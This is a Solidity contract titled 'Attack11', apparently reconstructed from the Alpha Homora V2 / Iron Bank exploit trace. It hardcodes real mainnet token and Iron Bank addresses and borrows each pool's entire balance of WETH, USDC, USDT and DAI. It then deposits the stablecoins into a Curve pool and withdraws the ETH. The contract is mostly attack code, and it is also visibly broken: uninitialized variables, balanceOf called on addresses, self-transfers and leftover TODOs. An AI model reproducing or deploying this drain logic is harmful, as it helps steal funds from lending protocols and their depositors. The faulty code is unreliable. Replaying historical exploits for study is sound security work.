// SPDX-License-Identifier: MIT
/**
 * @title attack 11
 * Borrow 13,244.63 WETH + 3.6M USDC + 5.6M USDT + 4.26M DAI
 * Supply the stablecoins to Aave (to get aTokens, so USDC & USDT can’t be frozen)
 * Supply aDAI, aUSDT, aUSDC to Curve a3Crv pool
 */
pragma solidity 0.8.17;

import "./interface/IHomoraBank.sol";
import "./interface/IUniswapRouter.sol";
import "./interface/IUniswapV2Pair.sol";
import "./interface/IIronBank.sol";
import "./interface/ICurve.sol";

import "./interface/IERC20.sol";
import "./interface/IWERC20.sol";
import "./interface/CERC20.sol";

import "./interface/IAAVE.sol";

import "hardhat/console.sol";

contract Attack11 {
    address public curve_aDAI_Pool;
    address public wETH;

    IERC20 public usdc;
    IERC20 public sUSD;
    IERC20 public dai;
    IERC20 public usdt;

    CERC20 public cySUSD;
    CERC20 public cyUSDC;
    CERC20 public cyUSDT;
    CERC20 public cyDAI;
    CERC20 public cyWETH;
    // TODO: check curve LP token interface
    CERC20 public a3CRVT;

  constructor() {
        curve_aDAI_Pool = 0xDeBF20617708857ebe4F679508E7b7863a8A8EeE;
        
        wETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        sUSD = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
        dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

        cySUSD = CERC20(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8);
        cyUSDC = CERC20(0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c);
        cyUSDT = CERC20(0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a);
        cyDAI = CERC20(0x8e595470Ed749b85C6F7669de83EAe304C2ec68F);
        cyWETH = CERC20(0x41c84c0e2EE0b740Cf0d31F63f3B6F627DC6b393);
    }

  function attack() external {
    /** 
     * 1. [Wrapped Ether].balanceOf([Iron Bank: cyWETH]) → (13244630331762545750401) 
     * [Iron Bank: cyWETH].borrow(borrowAmount=13244630331762545750401) → (0)
     */
    uint256 amount1 = wETH.balanceOf(cyWETH);
    cyWETH.borrow(amount1);

    /** 2. 
     * [Centre: USD Coin].balanceOf(user=[Iron Bank: cyUSDC]) → (3605354889525) 
     * [Iron Bank: cyUSDC].borrow(borrowAmount=3605354889525) → (0)
     */
    uint256 amount2 = usdc.balanceOf(cyUSDC);
    cyUSDC.borrow(amount2);

    /** 
     * 3. [Tether: USDT Stablecoin].balanceOf(who=[Iron Bank: cyUSDT]) → (5647242107646) 
     * [Iron Bank: cyUSDT].borrow(borrowAmount=5647242107646) → (0)
     */
    uint256 amount3 = usdt.balanceOf(cyUSDT);
    cyUSDT.borrow(amount3);

    /** 
     * 4. [Dai Stablecoin].balanceOf([Iron Bank: cyDAI]) → (4263138929122643119834654) 
     * [Iron Bank: cyDAI].borrow(borrowAmount=4263138929122643119834654) → (0)
     */
    uint256 amount4 = dai.balanceOf(cyDAI);
    cyDAI.borrow(amount4);

    /** 
     * 5. [Synthetix: Proxy sUSD Token].balanceOf(owner=[Cream.Finance: cySUSD Token]) → (0) 
     * [Cream.Finance: cySUSD Token].borrow(borrowAmount=0) → (0)
     */
    uint256 amount5 = sUSD.balanceOf(cySUSD);
    cySUSD.borrow(amount5);

    /** 
     * 6. [Synthetix: Proxy sUSD Token].balanceOf(owner=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (0) 
     * [Synthetix: Proxy sUSD Token].transfer(to=[Alpha Homora V2 Exploiter], value=0) → (true)
     */
    uint256 amount6 = sUSD.balanceOf(address(this));
    sUSD.transfer(address(this), 0);

    /** 7. [Dai Stablecoin].balanceOf(0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (4263138929122643119834654) */
    uint256 amount7 = dai.balanceOf(address(this));

    /** 8. [Centre: USD Coin].balanceOf(user=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (3997921016170) */
    uint256 amount8 = usdc.balanceOf(address(this));

    /** 
     * 9. [Tether: USDT Stablecoin].balanceOf(who=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (5647242107646) 
     * [Curve.fi: aDAI/aUSDC/aUSDT Pool].add_liquidity(_amounts=[4263138929122643119834654, 3997921016170, 5647242107646], _min_mint_amount=0, _use_underlying=true) → (13532845885656673015123177)
     */
    uint256 amount9 = usdt.balanceOf(address(this));
    curve_aDAI_Pool.add_liquidity([4263138929122643119834654, 3997921016170, 5647242107646], 0, true);

    /**
     * 10.[Curve.fi: a3CRV Token].balanceOf(arg0=0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (13532845885656673015123177) 
     * [Curve.fi: a3CRV Token].transfer(_to=[Alpha Homora V2 Exploiter], _value=13532845885656673015123177) → (true)
     */
    uint256 amount10 = a3CRVT.balanceOf(address(this));
    a3CRVT.transfer(address(this), amount10);

    /** 
     * 11. [Wrapped Ether].balanceOf(0x560A8E3B79d23b0A525E15C6F3486c6A293DDAd2) → (13244630331762545750401) 
     * [Wrapped Ether].withdraw(wad=13244630331762545750401) → ()
     * TODO: fallback
     * [Alpha Homora V2 Exploiter].fallback[13244.631828688428795676 ETH]() → (0x)
     */
    uint256 amount11 = wETH.balanceOf(address(this));
    wETH.withdraw(amount11);
  }
}